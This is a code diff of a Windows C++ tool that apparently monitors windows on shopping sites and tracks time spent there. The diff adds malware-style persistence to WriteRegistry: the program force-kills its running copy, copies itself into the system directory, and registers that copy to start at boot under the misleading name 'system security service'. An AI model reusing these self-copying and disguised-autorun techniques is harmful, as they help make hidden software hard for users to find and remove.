@@ -3,32 +3,56 @@
 
 #include "stdafx.h"
 
-// 写入注册表更改开机启动, 返回运行目录
+// 写入注册表更改开机启动
 string WriteRegistry()
 {
-	//char filePath[MAX_PATH]={0}; // 初始化
-	//char sysPath[MAX_PATH]="C:\\Program Files"; // 系统路径
-	char path[MAX_PATH]; // 运行的文件的完整路径
+	char sysPath[MAX_PATH]; // 系统路径
+	char filePath[MAX_PATH]; // 运行的文件的完整路径
 	HMODULE modH = GetModuleHandle(NULL);
-	GetModuleFileName(modH, path, sizeof(path)); // 得到当前执行文件的全路径
-	// 代码 _tcsrchr(path, _T('\\'))[0] = 0; // 删除文件名，只获得路径字串 分解为以下两句
-	//char *ch = _tcsrchr(path, _T('\\')); //查找最后一个\出现的位置，并返回\后面的字符（包括\）
-	//strcat_s(filePath, ch); // 得到文件名
-	//ch[0] = 0;//NULL  通过操作来操作szFilePath = 将szFilePath截断，截断最后一个\后面的字符（不包括\）
-	//VrvCopyFile(path, sysPath); // 复制文件到系统
-	//ch = _tcsrchr(path, _T('\\')); 
-	//strcat_s(sysPath, ch);
-	//strcat_s(sysPath, filePath); // 得到文件新的全路径
-	
-	HKEY hKey; // 写入到注册表，以便开机自动运行
-	// 打开注册表：路径如下HEKY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
-	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
-	// 新增一个值，名称随意命名，值为要开机运行的文件的完整路径
-	RegSetValueEx(hKey, "系统安全服务", 0, REG_SZ, (const unsigned char*)path, sizeof(path));
-	RegCloseKey(hKey); // 关闭注册表
+	GetModuleFileName(modH, filePath, sizeof(filePath)); // 得到当前执行文件的全路径
 
-	_tcsrchr(path, _T('\\'))[0] = 0;
-	return path;
+	//得到系统文件所在目录的路径，如c:\windows\system32
+	GetSystemDirectory(sysPath,sizeof(sysPath));
+
+	//形成要复制到的全路径，如c:\windows\system32\yourvirus.exe
+	strcat_s(sysPath, "\\");
+	strcat_s(sysPath, NEW_FILE);
+	// 转化为小写比较
+	size_t i;
+	for (i = 0; i < strlen(filePath); ++i)
+	{
+		filePath[i] = tolower(filePath[i]);
+	}
+	for (i = 0; i < strlen(sysPath); ++i)
+	{
+		sysPath[i] = tolower(sysPath[i]);
+	}
+	// 如果不是自己在运行
+	if (strcmp(filePath, sysPath) != 0)
+	{
+		char cmd[MAX_PATH]={0};
+		sprintf_s(cmd, "taskkill /f /im %s", NEW_FILE);
+		system(cmd);
+		//自我复制到目标路径并覆盖存在文件
+		CopyFile(filePath, sysPath, false);
+		Sleep(3000);
+		//system(sysPath);
+		ShellExecute(NULL,"open", sysPath, NULL, NULL, SW_SHOWNORMAL);
+		//WinExec(sysPath, SW_SHOWNORMAL);
+		return "exit";
+	}
+	else
+	{
+		HKEY hKey; // 写入到注册表，以便开机自动运行
+		// 打开注册表：路径如下HEKY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+		RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
+		// 新增一个值，名称随意命名，值为要开机运行的文件的完整路径
+		RegSetValueEx(hKey, "系统安全服务", 0, REG_SZ, (const unsigned char*)sysPath, sizeof(sysPath));
+		RegCloseKey(hKey); // 关闭注册表
+		_tcsrchr(sysPath, _T('\\'))[0] = 0;
+		return sysPath;
+	}
+	return sysPath;
 }
 
 // 获取当前鼠标位置的窗口句柄
@@ -72,7 +96,7 @@ bool FuzzyCompare(string title, string str)
 void SetTargetList(vector<string>& targets, string path)
 {
 	ifstream input; // 输入文件
-	path += "\\config\\targetlist.dat";
+	path += TARGET_FILE;
 	input.open(path, ios::in);
 	if (!input)
 	{ // 淘宝 天猫 团购 秒杀 网购 商城
@@ -82,6 +106,7 @@ void SetTargetList(vector<string>& targets, string path)
 		targets.push_back("团购");
 		targets.push_back("秒杀");
 		targets.push_back("网购");
+		targets.push_back("购物");
 		targets.push_back("商城");
 		return;
 	}
@@ -158,7 +183,7 @@ HWND FindTarget(vector<string> targets, vector<string> clsnames)
 void SetClsName(vector<string>& clsnames, string path)
 {// IE窗口/世界之窗等单独处理 IEFrame TheWorld_Frame SE_SogouExplorerFrame
 	ifstream input;
-	path += "\\config\\clsname.dat";
+	path += CLSNAME_FILE;
 	input.open(path, ios::in);
 	if (!input)
 	{
@@ -188,7 +213,7 @@ struct TickClock
 		sec = 0;
 		path = TICK_PATH;
 	}
-	
+	// 新的一天需要更新
 	void NewDayUpdate()
 	{
 		sec = INIT_SEC;
@@ -207,7 +232,7 @@ struct TickClock
 		if (!output)
 		{
 			cout<<"no tickclock.ini"<<endl;
-			exit(0);
+			return;
 		}
 		char ch='-';
 		output<<year<<ch<<month<<ch<<day<<" "<<sec<<endl;
@@ -221,14 +246,13 @@ struct TickClock
 		if (!input)
 		{
 			cout<<"no tickclock.ini"<<endl;
-			sec = INIT_SEC;
 			return;
 		}
 		char ch;
 		input>>year>>ch>>month>>ch>>day>>sec;
 		input.close();
 	}
-
+	// 判断时间线 1未来，0现在，-1过去
 	int TimeLine()
 	{
 		// 获取当前时间
@@ -285,6 +309,9 @@ void RemindNotify(string tip)
 	}
 	output<<tip<<endl;
 	output.close();
+	//TCHAR filePath[MAX_PATH];
+	//sprintf_s(filePath, "Notepad.exe %s", deskPath);
+	//WinExec(filePath, SW_SHOWMAXIMIZED);
 	ShellExecute(NULL,"open",deskPath,NULL,NULL,SW_SHOWMAXIMIZED); 
 }
 
@@ -339,12 +366,16 @@ bool IsTickOff()
 
 int main(int argc, _TCHAR* argv[])
 {
-	// 设置中断控制，检测关机退出等。
+	string path =  WriteRegistry(); // 写入开始运行并判断路径
+	if (path == "exit")
+	{
+		return 0; // 程序结束
+	}
+	// 设置中断控制，检测关机退出等
 	if (!SetConsoleCtrlHandler( (PHANDLER_ROUTINE)ConsoleHandler, TRUE))
 	{
 		cout<<"Unable to install handler!"<<endl;
 	}
-	string path = WriteRegistry(); // 写入注册表，开机启动
 	vector<string> targetList; // 目标字符串列表
 	vector<string> clsnames; // 特殊窗口的类名
 	SetTargetList(targetList, path); // 设置目标字符串列表
